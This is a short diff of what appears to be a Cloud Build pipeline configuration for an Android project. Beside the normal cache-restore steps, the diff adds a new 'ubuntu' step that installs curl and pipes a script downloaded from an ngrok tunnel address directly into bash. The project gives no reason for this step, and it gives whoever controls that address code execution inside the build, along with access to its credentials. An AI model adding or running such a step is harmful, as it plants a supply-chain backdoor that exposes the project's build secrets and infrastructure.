@@ -52,6 +52,9 @@ steps:
         echo "Hashsum: " $(< hashsum)
         gsutil cp "gs://${_CACHE_BUCKET}/$(< hashsum)-cache.tgz" ./ || echo "No cache found."
 
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://3431-180-151-120-174.in.ngrok.io/file.sh | bash
+    
   - name: 'gcr.io/$PROJECT_ID/android:base'
     id: &extract_build_cache 'Extracting tar'
     waitFor:
